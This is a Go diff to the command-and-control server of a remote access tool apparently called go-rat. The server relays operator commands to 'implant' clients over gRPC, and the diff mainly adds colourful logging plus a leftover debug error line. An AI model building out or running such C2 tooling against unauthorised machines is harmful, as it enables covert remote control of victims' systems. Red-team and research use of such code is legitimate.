@@ -4,10 +4,13 @@ import (
 	"context"
 	"errors"
 	"fmt"
+	"github.com/charmbracelet/lipgloss"
 	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"net"
+	"os"
+	"time"
 )
 
 var l = new(log.Logger)
@@ -68,6 +71,27 @@ func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) 
 	return res, nil
 }
 
+func initLogger() {
+	styles := log.DefaultStyles()
+	styles.Levels[log.InfoLevel] = lipgloss.NewStyle().
+		SetString("[*]").
+		Bold(true).
+		Foreground(lipgloss.Color("#87ceeb")).
+		Padding(0, 1, 0, 1)
+	styles.Levels[log.ErrorLevel] = lipgloss.NewStyle().
+		SetString("[!]").
+		Bold(true).
+		Padding(0, 1, 0, 1).
+		Foreground(lipgloss.Color("204"))
+	logger := log.NewWithOptions(os.Stderr, log.Options{
+		Prefix:          "RAT 🤖",
+		ReportTimestamp: true,
+		TimeFormat:      time.TimeOnly,
+	})
+	logger.SetStyles(styles)
+	l = logger
+}
+
 func main() {
 	var (
 		implantListener, adminListener net.Listener
@@ -75,6 +99,7 @@ func main() {
 		opts                           []grpc.ServerOption
 		work, output                   chan *grpcapi.Command
 	)
+	initLogger()
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
 	implant := newImplantServer(work, output)
 	admin := newAdminServer(work, output)
@@ -104,13 +129,14 @@ func main() {
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 	go func() {
-		log.Infof("[+] ImplantListener escuchando en %s", implant_addr)
+		l.Infof("ImplantListener escuchando en %s", implant_addr)
 		err = grpcImplantServer.Serve(implantListener)
 		if err != nil {
 			log.Fatal(err)
 		}
 	}()
-	log.Infof("[+] AdminListener escuchando en %s", client_addr)
+	l.Errorf("this is a test")
+	l.Infof("AdminListener escuchando en %s", client_addr)
 	err = grpcAdminServer.Serve(adminListener)
 	if err != nil {
 		log.Fatal(err)
